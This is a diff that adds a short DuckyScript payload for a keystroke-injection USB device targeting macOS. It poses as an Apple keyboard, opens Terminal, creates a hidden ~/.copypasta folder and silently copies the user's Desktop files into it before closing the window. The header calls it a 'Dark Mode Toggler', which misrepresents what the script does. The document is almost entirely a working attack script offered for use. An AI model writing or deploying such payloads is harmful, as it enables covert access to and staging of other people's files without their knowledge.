@@ -1,0 +1,32 @@
+REM Creates Hidden Folder and Copies Desktop Contents
+REM To find the folder follow the steps below.
+
+REM Open Finder.
+REM Click on "Go" in the menu bar at the top of the screen.
+REM Select "Go to Folder" from the dropdown menu.
+REM In the "Go to the folder" dialog box, enter '~/.copypasta' and click "Go".
+
+REM Author: Narsty
+REM Title: Dark Mode Toggler
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Executions
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING mkdir ~/.copypasta
+DELAY 500
+ENTER
+DELAY 500
+STRING cp -R ~/Desktop/* ~/.copypasta/
+DELAY 500
+ENTER
+DELAY 500
+GUI W 
